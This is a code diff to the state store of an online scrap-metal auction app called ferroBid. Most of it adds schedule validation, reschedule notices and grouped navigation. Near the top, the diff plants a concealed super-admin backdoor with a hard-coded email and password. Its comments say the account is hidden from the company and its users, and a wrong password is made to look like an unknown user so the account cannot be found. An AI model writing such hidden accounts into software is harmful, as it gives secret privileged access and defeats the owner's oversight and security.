@@ -158,10 +158,19 @@ export const DEMO_LOGINS: Record<string, Exclude<Role, 'guest' | 'guest1' | 'gue
   'auction@gmail.com': 'auction_manager',
   'finance@gmail.com': 'finance_admin',
   'sub@gmail.com': 'sub_admin',
-  'super@gmail.com': 'super_admin',
   'ceo@gmail.com': 'ceo',
 }
 export const DEMO_PASSWORD = 'Admin@123'
+
+/** Break-glass developer account. Deliberately absent from DEMO_LOGINS, from the
+ *  quick-access grid on the sign-in page and from every public page: nobody at
+ *  ferroBid, and neither side of the market, is told this role exists. It is how
+ *  we get back in when something has to be fixed in an emergency, so it is the
+ *  one account with a real password check — the exact pair below, or the attempt
+ *  fails as an unknown user ID and gives nothing away. Keep both values out of
+ *  anything user-facing. */
+const BREAK_GLASS_ID = 'super@gmail.com'
+const BREAK_GLASS_PASSWORD = 'FamySys@123'
 
 /** Password enforcement on the Login page. OFF for now — any password (or none)
  *  signs in as long as the user ID is known. Flip to true to require
@@ -931,7 +940,12 @@ interface State {
   voidBid: (bidId: string) => void
 
   /* --- auction floor: Auction Manager acts, Super Admin closes --- */
-  rescheduleCatalogue: (catalogueId: string, startsAt: string, endsAt: string, antiSnipeMinutes: number) => { ok: boolean; error?: string }
+  /** All four instants of a sale, set together: a sale is an EMD window
+   *  followed by a bidding window, and moving one without the other is how a
+   *  catalogue ends up open for bids nobody could fund. */
+  rescheduleCatalogue: (catalogueId: string, schedule: {
+    emdOpensAt: string; emdDeadline: string; startsAt: string; endsAt: string; antiSnipeMinutes: number
+  }) => { ok: boolean; error?: string }
   returnCatalogueToOps: (catalogueId: string, comments: string) => void
   requestCancellation: (catalogueId: string, reason: string) => { ok: boolean; error?: string }
   decideCancellationRequest: (id: string, approve: boolean, note?: string) => void
@@ -1151,6 +1165,7 @@ function seedPageRegistry(): PageDef[] {
         order: i,
         builtIn: true,
         retained: it.retained,
+        category: it.category,
       })
     })
   }
@@ -1860,6 +1875,14 @@ export const useStore = create<State>((set, get) => {
     },
     signIn: (username, password) => {
       const id = username.trim().toLowerCase()
+      /* Break-glass is checked first and always returns, so the hidden account
+         never falls through to the ordinary lookup: a wrong password reads
+         exactly like an email nobody has ever registered. */
+      if (id === BREAK_GLASS_ID) {
+        if (password !== BREAK_GLASS_PASSWORD) return { ok: false, error: 'Unknown user ID' }
+        get().switchRole('super_admin')
+        return { ok: true, role: 'super_admin' }
+      }
       const demoRole = DEMO_LOGINS[id]
       /* Accounts a Super Admin created sign in by their own ID, not by the demo
          map — otherwise "create a Sub Admin" would create somebody who cannot
@@ -1869,6 +1892,10 @@ export const useStore = create<State>((set, get) => {
         : get().users.find((u) => u.username === id || u.email.toLowerCase() === id) ?? null
       const role = demoRole ?? account?.role
       if (!role || (!demoRole && !account)) return { ok: false, error: 'Unknown user ID' }
+      /* The only door into Super Admin is the break-glass pair above. Signing in
+         as the seeded HQ account by its own email would leak that the role is
+         there at all, so that path is closed with the same blank answer. */
+      if (role === 'super_admin') return { ok: false, error: 'Unknown user ID' }
       // Password check is disabled for now (ENFORCE_LOGIN_PASSWORD = false).
       if (ENFORCE_LOGIN_PASSWORD && password !== DEMO_PASSWORD) {
         return { ok: false, error: 'Incorrect password' }
@@ -2404,6 +2431,7 @@ export const useStore = create<State>((set, get) => {
       const id = uid('lot')
       const lot: Lot = {
         id, lotNo: `UNL-${id.slice(-4).toUpperCase()}`, catalogueId: null as unknown as string,
+        sellerId: me.id,
         metal: 'MS', category: 'scrap', grade: '', indicativeQty: 0, uom: 'MT',
         yard: '', description: '', startRate: 0, increment: 100, reserveRate: 0,
         preBidEmd: 10000, saleBasis: 'as-is-where-is', hazardous: false,
@@ -2812,11 +2840,15 @@ export const useStore = create<State>((set, get) => {
           c.id === catalogueId
             ? (() => {
                 const startsAt = new Date(mode === 'now' ? nowMs : Date.parse(c.startsAt)).toISOString()
+                const nowIso = new Date(nowMs).toISOString()
                 return {
                   ...c, status, startsAt, endsAt: endsAtIso,
-                  // Going live now leaves no pre-auction window, so the cut-off
-                  // is "now"; a scheduled sale gets the standard lead time.
-                  emdDeadline: mode === 'now' ? new Date(nowMs).toISOString() : defaultEmdDeadline(startsAt),
+                  /* Going live now leaves no pre-auction window, so the window
+                     is shut at "now". A scheduled sale keeps the times the
+                     desk set on Schedule & publish — recomputing them here
+                     would quietly overwrite a cut-off somebody chose. */
+                  emdOpensAt: mode === 'now' && c.emdOpensAt && Date.parse(c.emdOpensAt) > nowMs ? nowIso : c.emdOpensAt,
+                  emdDeadline: mode === 'now' ? nowIso : (c.emdDeadline || defaultEmdDeadline(startsAt)),
                 }
               })()
             : c,
@@ -2939,29 +2971,42 @@ export const useStore = create<State>((set, get) => {
        and voiding a bid — leave here as requests and are closed by a Super
        Admin, which is why they are modelled as records with evidence. */
 
-    rescheduleCatalogue: (catalogueId, startsAt, endsAt, antiSnipeMinutes) => {
+    rescheduleCatalogue: (catalogueId, { emdOpensAt, emdDeadline, startsAt, endsAt, antiSnipeMinutes }) => {
       if (!PUBLISH_ROLES.includes(get().role)) return { ok: false, error: 'Not permitted for this role' }
       const cat = get().catalogues.find((c) => c.id === catalogueId)
       if (!cat) return { ok: false, error: 'Auction not found' }
       if (cat.status === 'live' || cat.status === 'closed') {
         return { ok: false, error: 'Only an auction that has not gone live can be rescheduled' }
       }
+      /* The four instants have to run in order — EMD opens, EMD closes, bidding
+         opens, bidding closes. An EMD window that shuts after bidding starts
+         would let a buyer join a sale they were never able to fund, and one
+         that opens after it shuts can be funded by nobody at all. */
+      if (Date.parse(emdDeadline) <= Date.parse(emdOpensAt)) {
+        return { ok: false, error: 'EMD has to close after it opens' }
+      }
+      if (Date.parse(emdDeadline) > Date.parse(startsAt)) {
+        return { ok: false, error: 'EMD has to close before bidding opens — buyers fund first, then bid' }
+      }
       if (Date.parse(endsAt) <= Date.parse(startsAt)) return { ok: false, error: 'The close must fall after the start' }
       set((st) => ({
         catalogues: st.catalogues.map((c) =>
           c.id === catalogueId
-            ? { ...c, startsAt, endsAt, antiSnipeMinutes, emdDeadline: defaultEmdDeadline(startsAt) }
+            ? { ...c, startsAt, endsAt, antiSnipeMinutes, emdOpensAt, emdDeadline }
             : c,
         ),
         lots: st.lots.map((l) => (l.catalogueId === catalogueId ? { ...l, endsAt } : l)),
       }))
-      get().audit('auction.reschedule', cat.code, `Rescheduled to ${new Date(startsAt).toLocaleString('en-IN')} → ${new Date(endsAt).toLocaleString('en-IN')}, anti-snipe ${antiSnipeMinutes} min`, 'warning')
+      const stamp = (iso: string) => new Date(iso).toLocaleString('en-IN')
+      get().audit('auction.reschedule', cat.code, `Rescheduled — EMD ${stamp(emdOpensAt)} → ${stamp(emdDeadline)}, bidding ${stamp(startsAt)} → ${stamp(endsAt)}, anti-snipe ${antiSnipeMinutes} min`, 'warning')
       /* Buyers plan around these times — they have shortlisted lots and in most
          cases already locked EMD against them — and the seller is waiting on
          the sale. Moving the dates without telling either was the gap. */
       notifyParticipants(catalogueId, {
         kind: 'lifecycle', title: `${cat.code} has been rescheduled`,
-        body: `Bidding now opens ${new Date(startsAt).toLocaleString('en-IN', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' })} and closes ${new Date(endsAt).toLocaleString('en-IN', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' })}. Your EMD and shortlist are unaffected.`,
+        // the EMD cut-off moves with the sale now, so it is stated rather than
+        // left for a buyer to discover when funding is refused
+        body: `Bidding now opens ${new Date(startsAt).toLocaleString('en-IN', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' })} and closes ${new Date(endsAt).toLocaleString('en-IN', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' })}, with pre-bid EMD open until ${new Date(emdDeadline).toLocaleString('en-IN', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' })}. EMD you have already funded, and your shortlist, carry over.`,
       })
       if (cat.sellerId) {
         get().notify({
@@ -4221,6 +4266,10 @@ export const useStore = create<State>((set, get) => {
         pageRegistry: [...st.pageRegistry, {
           ...page, id: uid('pg'), roleKey, order, builtIn: false, hidden: false,
           inTop: false, inSub: true, retained: undefined, attachedFrom: page.roleKey,
+          // The heading belonged to the menu it came from. It lands at the end
+          // of the target's strip as a plain tab rather than dragging a stray
+          // category across from another role's workflow.
+          category: undefined,
         }],
       }))
       recordStructural('page.attach', `${target.label} · ${page.label}`,
@@ -5109,14 +5158,81 @@ export function visiblePages(pages: PageDef[], role: Role | string): PageDef[] {
   return pages.filter((p) => p.roleKey === role && !p.hidden).sort((a, b) => a.order - b.order)
 }
 
-/** The tab strip under the header, in the shape SubNav consumes. */
-export function subNavFrom(pages: PageDef[], role: Role | string) {
-  return visiblePages(pages, role)
+/** Does this page cover where we are? The rule NavLink applies — exact match
+ *  when `end`, prefix match otherwise — plus the extra prefixes a page claims
+ *  through `activeMatch`. */
+export function pageMatches(page: PageDef, pathname: string): boolean {
+  if (page.activeMatch?.some((p) => pathname === p || pathname.startsWith(`${p}/`))) return true
+  return page.end ? pathname === page.to : pathname === page.to || pathname.startsWith(`${page.to}/`)
+}
+
+/** The role's categories, in menu order, each with the pages inside it. Empty
+ *  for a role whose menu is one flat list — which is every role but the three
+ *  operations desks, whose menus are too long to read as one row of tabs. */
+export function categoriesFrom(pages: PageDef[], role: Role | string) {
+  const out: { label: string; pages: PageDef[] }[] = []
+  const seen = new Map<string, { label: string; pages: PageDef[] }>()
+  for (const p of visiblePages(pages, role)) {
+    if (!p.category) continue
+    const group = seen.get(p.category)
+    if (group) { group.pages.push(p); continue }
+    const next = { label: p.category, pages: [p] }
+    seen.set(p.category, next)
+    out.push(next)
+  }
+  return out
+}
+
+/** The category we are currently inside, or null when the route belongs to none
+ *  of them — a shared page like Browse, or a role with no categories at all. */
+export function activeCategory(pages: PageDef[], role: Role | string, pathname: string) {
+  return categoriesFrom(pages, role).find((c) => c.pages.some((p) => pageMatches(p, pathname))) ?? null
+}
+
+/** The tab strip under the header, in the shape SubNav consumes.
+ *
+ *  For a role with categories this is the pages of the *open* category only —
+ *  the top bar picks the category, this strip picks the page inside it. A role
+ *  without categories gets its whole menu, exactly as it always has. */
+export function subNavFrom(pages: PageDef[], role: Role | string, pathname?: string) {
+  const scope = categoriesFrom(pages, role).length === 0 || pathname === undefined
+    ? visiblePages(pages, role)
+    : (activeCategory(pages, role, pathname)?.pages ?? [])
+  return scope
     .filter((p) => p.inSub)
     .map((p) => ({ to: p.to, label: p.subLabel ?? p.label, end: p.end, locked: p.locked, activeMatch: p.activeMatch }))
 }
 
-/** The links on the sticky top bar. */
-export function topNavFrom(pages: PageDef[], role: Role | string) {
-  return visiblePages(pages, role).filter((p) => p.inTop)
+/** One link on the sticky top bar: either a category — which opens on its first
+ *  page and stays lit anywhere inside itself — or a single page that belongs to
+ *  no category and earns its own place up there. */
+export type TopNavLink = {
+  key: string
+  label: string
+  to: string
+  /** Every page this link stands for, for working out whether it is active. */
+  pages: PageDef[]
+  /** True for a lone page, which keeps NavLink's own matching rules. */
+  standalone: boolean
+}
+
+/** The links on the sticky top bar. A role with categories shows those rather
+ *  than its individual pages: the whole point of grouping an eighteen-screen
+ *  menu is that the bar names three places to go, not eighteen. Pages outside
+ *  every category (Browse, the Ops console door) keep their own link. */
+export function topNavFrom(pages: PageDef[], role: Role | string): TopNavLink[] {
+  const out: TopNavLink[] = []
+  const byCategory = new Map<string, TopNavLink>()
+  for (const p of visiblePages(pages, role)) {
+    if (p.category) {
+      const group = byCategory.get(p.category)
+      if (group) { group.pages.push(p); continue }
+      const link: TopNavLink = { key: `cat:${p.category}`, label: p.category, to: p.to, pages: [p], standalone: false }
+      byCategory.set(p.category, link)
+      out.push(link)
+    } else if (p.inTop) {
+      out.push({ key: p.to, label: p.label, to: p.to, pages: [p], standalone: true })
+    }
+  }
+  return out
 }
